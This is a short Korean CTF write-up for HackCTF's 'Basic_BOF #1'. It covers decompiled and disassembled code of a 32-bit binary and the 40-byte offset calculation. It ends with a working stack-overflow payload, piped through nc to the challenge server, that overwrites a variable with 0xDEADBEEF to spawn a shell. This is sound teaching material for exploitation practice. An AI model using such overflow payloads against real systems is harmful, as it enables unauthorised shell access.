---


---

<h1 id="hackctfbasic_bof-1">HackCTF:Basic_BOF #1</h1>
<h2 id="section">2019-07-31</h2>
<p><code>file bof_basic</code>로 파일을 확인해 본다.</p>
<pre><code>bof_basic: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2f533dce11288567796018c2c74b5d09954e60cd, not stripped
</code></pre>
<p><em>IDA-Hexlay</em></p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+4h] [ebp-34h]
  int v5; // [esp+2Ch] [ebp-Ch]

  v5 = 67305985;
  fgets(&amp;s, 45, stdin);
  printf("\n[buf]: %s\n", &amp;s);
  printf("[check] %p\n", v5);
  if ( v5 != 67305985 &amp;&amp; v5 != -559038737 )
    puts("\nYou are on the right way!");
  if ( v5 == -559038737 )
  {
    puts("Yeah dude! You win!\nOpening your shell...");
    system("/bin/dash");
    puts("Shell closed! Bye.");
  }
  return 0;
}
</code></pre>
<h2 id="section-1">2019-08-01</h2>
<p>67305985(0x4030201) 이 변수(이하 n1으로 칭함)로 들어가고 n1이 -559038737(0xFFFFFFFFDEADBEEF)이여야 쉘을 호출한다.<br>
목적은 <code>fgets()</code>를 이용해 BOF하여 n1을 '0xDEADBEEF’로 변환시키는 것이다.</p>
<p><em>pwngdb</em></p>
<pre><code>0x080484ee &lt;+35&gt;:	lea    eax,[ebp-0x34]
0x080484f1 &lt;+38&gt;:	push   eax
0x080484f2 &lt;+39&gt;:	call   0x8048380 &lt;fgets@plt&gt;
0x080484f7 &lt;+44&gt;:	add    esp,0x10
0x080484fa &lt;+47&gt;:	sub    esp,0x8
0x080484fd &lt;+50&gt;:	lea    eax,[ebp-0x34]
0x08048500 &lt;+53&gt;:	push   eax
0x08048501 &lt;+54&gt;:	push   0x8048610
0x08048506 &lt;+59&gt;:	call   0x8048370 &lt;printf@plt&gt;
0x0804850b &lt;+64&gt;:	add    esp,0x10
0x0804850e &lt;+67&gt;:	sub    esp,0x8
0x08048511 &lt;+70&gt;:	push   DWORD PTR [ebp-0xc]
0x08048514 &lt;+73&gt;:	push   0x804861c
0x08048519 &lt;+78&gt;:	call   0x8048370 &lt;printf@plt&gt;
0x0804851e &lt;+83&gt;:	add    esp,0x10
0x08048521 &lt;+86&gt;:	cmp    DWORD PTR [ebp-0xc],0x4030201
0x08048528 &lt;+93&gt;:	je     0x8048543 &lt;main+120&gt;
0x0804852a &lt;+95&gt;:	cmp    DWORD PTR [ebp-0xc],0xdeadbeef
</code></pre>
<p>함수 <code>fgets()</code>를 통해 저장되는 주소는 ebp-0x34(ebp-52)이며 0x4030201이 들어간 변수의 주소는 ebp-0xc(ebp-12)이다. 총 40byte의 차이다.</p>
<pre><code>(python -c 'print "A" * 40 + "\xef\xbe\xad\xde"'; cat) | nc  ctf.j0n9hyun.xyz 3000
</code></pre>

